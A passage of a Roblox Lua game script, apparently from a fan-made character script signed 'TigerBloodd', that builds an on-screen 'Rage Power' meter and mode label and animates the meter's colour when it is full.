re(pg,"TBGui") raigcol="Bright red" raigcol2="New Yeller" raigcol3="Navy blue" raigcol4="Bright red"
Gui=it("ScreenGui",pg) Gui.Name="TBGui"
fr=it("Frame",Gui) fr.Size=ud(1,0,1,0) fr.Active=false fr.BackgroundTransparency=1
mptray=it("TextLabel",fr) mptray.BackgroundColor3=bc("Black").Color
mptray.Size=ud(0.18,0,0.08,0) mptray.BorderSizePixel=0 mptray.Position=ud(0.41,0,0.025,0) mptray.Text=""
mptext=it("TextLabel",mptray) mptext.BackgroundTransparency=1 mptext.Size=ud(1,0,0.5,0) mptext.Position = ud(0,0,0.1,0) mptext.TextColor3=bc("White").Color
mptext.FontSize="Size18" mptext.Font="ArialBold" mptext.ZIndex=2 mptext.Text="Rage Power"
mptext2=it("TextLabel",mptray) mptext2.BackgroundTransparency=1 mptext2.Size=ud(1,0,0.5,0) mptext2.Position = ud(0,0,0.4,0) mptext2.TextColor3=bc("White").Color
mptext2.FontSize="Size18" mptext2.Font="ArialBold" mptext2.ZIndex=2 mptext2.Text="/"
mpfill=it("ImageLabel",mptray) mpfill.BackgroundColor3=bc(raigcol).Color mpfill.Image=asset.."48965808" mpfill.Size=ud(0.97,0,0.90,0) mpfill.Position=ud(0.015,0,0.05,0) mpfill.ZIndex=2
sttray=it("ImageLabel",fr) sttray.BackgroundColor3=bc("Black").Color
sttray.Size=ud(0.2,0,0.055,0) sttray.BorderSizePixel=0 sttray.Position=ud(0.043,0,0.94,0) sttray.Image=asset.."48965808"
sttext=it("TextLabel",fr) sttext.BackgroundTransparency=1
sttext.Size=ud(0.2,0,0.055,0) sttext.BorderSizePixel=0 sttext.ZIndex=2 sttext.Position=ud(0.043,0,0.94,0)
sttext.FontSize="Size18" sttext.Font="ArialBold" sttext.Text="Mode:" sttext.TextColor3=bc("White").Color
q(function() while w() do mptext2.Text = ts(mf(mp)).. "/" ..ts(mf(maxmp)) sttext.Text=" " ..a.a.. " [" ..a.b.. "] " mpfill.Size=ud((0.97/maxmp)*mp,0,0.9,0) end end)
q(function() while w() do if mp >= maxmp then local raigcolz=bc(raigcol).Color local rr,gg,bb=raigcolz.r,raigcolz.g,raigcolz.b for xz=gg,gg-80,-5 do if mp < maxmp then mpfill.BackgroundColor3=bc(raigcol).Color break end mpfill.BackgroundColor3=c3(rr,xz,bb) w() end 
for xz=gg-80,gg,5 do if mp < maxmp then mpfill.BackgroundColor3=bc(raigcol).Color break end mpfill.BackgroundColor3=c3(rr,xz,bb) w() end end end end) mp=maxmp local runspi=0
fac = false bgg = it("BodyGyro",to)
while w() do hu.PlatformStand=false hu.Sit=false end
 
hu.Running:connect(function(spd) 
if spd>0 then running=true
elseif spd<1 then
running=false
end
end)
-- TigerBloodd
 